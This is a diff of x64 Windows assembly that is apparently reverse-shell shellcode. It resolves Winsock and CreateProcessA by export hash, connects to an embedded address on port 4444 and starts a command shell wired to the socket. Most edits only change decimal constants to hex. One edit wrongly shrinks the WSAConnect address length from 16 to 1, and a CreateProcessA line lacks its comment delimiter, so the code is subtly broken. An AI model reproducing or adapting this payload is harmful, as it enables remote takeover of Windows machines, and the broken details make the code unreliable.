@@ -12,7 +12,7 @@ kernel32:
     mov rdx, [rdx+0x20]     ; kernel32 base addrs
     xor r15, r15
 
-    cmp r13b, 1              ; not so random check
+    cmp r13b, 0x01              ; not so random check
     je setup_proc.cont
 
 .resolve_export:
@@ -28,7 +28,7 @@ kernel32:
     add r8, rdx             ; array of address of names rvas
  
 hash_loop:
-    mov esi, [r8 + r15 * 4]     ; address of name rva
+    mov esi, [r8 + r15 * 0x04]     ; address of name rva
     add rsi, rdx    ;           name va
     xor eax, eax
     xor r9, r9      ; hash accumulator
@@ -47,11 +47,11 @@ hash_loop:
 .found:
     mov eax, [rbx+0x24]  ; address of ordinals rva
     add rax, rdx        ; address of ordinals va
-    movzx rcx, word [rax + r15 * 2]     ; get function ordinal
+    movzx rcx, word [rax + r15 * 0x02]     ; get function ordinal
 
     mov eax, [rbx+0x1C]      ; rva of function addresses
     add rax, rdx        ; va to array of function addresses
-    mov eax, [rax + rcx * 4]    ; access function to find by index * 4 each function rva is a dword
+    mov eax, [rax + rcx * 0x04]    ; access function to find by index * 4 each function rva is a dword
     add rax, rdx        ; function
     cmp r11d, 0x3BFCEDCB    ; WSAStartup
     je wsastartup
@@ -76,11 +76,11 @@ loadlib:
 
 wsastartup:
     push rdx    ; save base ---: misaligned
-    sub rsp, 424    ; wsadata
+    sub rsp, 0x1A8    ; wsadata
     mov rcx, 0x202  ; version 2.2
     mov rdx, rsp    ; lpwsadata
     call rax    ; WSAStartup
-    add rsp, 424    ; restore stack
+    add rsp, 0x1A8    ; restore stack
     pop rdx     ; restore dll base
 
     xor r15, r15
@@ -88,16 +88,16 @@ wsastartup:
     jmp kernel32.resolve_export
 wsasocketa:
     push rdx    ; misaligned 
-    sub rsp, 56
-    mov rcx, 2
-    mov rdx, 1
+    sub rsp, 0x38
+    mov rcx, 0x02
+    mov rdx, 0x01
     mov r8, 6
     xor r9, r9
     mov dword 0x20[rsp], 0
     mov dword 0x28[rsp], 0
     call rax    ;   WSASocketA
     mov rdi, rax
-    add rsp, 56
+    add rsp, 0x38
     pop rdx    ; restore stack
     
     xor r15, r15
@@ -107,11 +107,11 @@ wsasocketa:
 inet_pton:
     push rdx
     sub rsp, 0x10
-    mov word [rsp], 2
+    mov word [rsp], 0x02
     mov word [rsp+2], 0x5C11    ; 4444 in big endian
     
 
-    mov cl, 2
+    mov cl, 0x02
     lea rdx, [rel ip]
     lea r8, [rsp+4]
     call rax    ; inet_pton
@@ -125,39 +125,39 @@ inet_pton:
     jmp kernel32.resolve_export
 
 wsaconnect:
-    sub rsp, 96
+    sub rsp, 0x60
     mov rcx, rdi    
     mov rdx, r14    ; sockin
-    mov r8b, 16
+    mov r8b, 0x1
     xor r9, r9
     mov qword [rsp+32], 0
     mov qword [rsp+40], 0
     mov qword [rsp+48], 0
     call rax    ;    WSAConnect
-    add rsp, 96
+    add rsp, 0x60
 
 setup_proc:
-    mov r13b, 1
+    mov r13b, 0x01
     jmp kernel32    
 .cont:
     xor r15, r15
     mov r11d, 0x16B3FE72    ; CreateProcessA
     jmp kernel32.resolve_export
 createprocessa:
-    sub rsp, 136    ; STARTUPINFOA + PROCESS_INFORMATION
-    mov dword [rsp], 112
+    sub rsp, 0x88    ; STARTUPINFOA + PROCESS_INFORMATION
+    mov dword [rsp], 0x70
     mov dword [rsp+60], 0x00000100
     mov qword [rsp+80], rdi
     mov qword [rsp+88], rdi
     mov qword [rsp+96], rdi
     mov r14, rsp 
 
-    sub rsp, 88
+    sub rsp, 0x58
     xor rcx, rcx
     lea rdx, [rel cmd]
     xor r8, r8
     xor r9, r9
-    mov byte [rsp+32], 1
+    mov byte [rsp+32], 0x01
     mov dword [rsp+40], 0
     mov qword [rsp+48], 0  
     mov qword [rsp+56], 0
@@ -166,8 +166,8 @@ createprocessa:
     lea rbx, [r14+112]
     mov qword [rsp+72], rbx
     call rax    CreateProcessA
-    add rsp, 88
-    add rsp, 136    ;  Restore stack
+    add rsp, 0x58
+    add rsp, 0x88    ;  Restore stack
 done: 
     ret
 ws2_32:
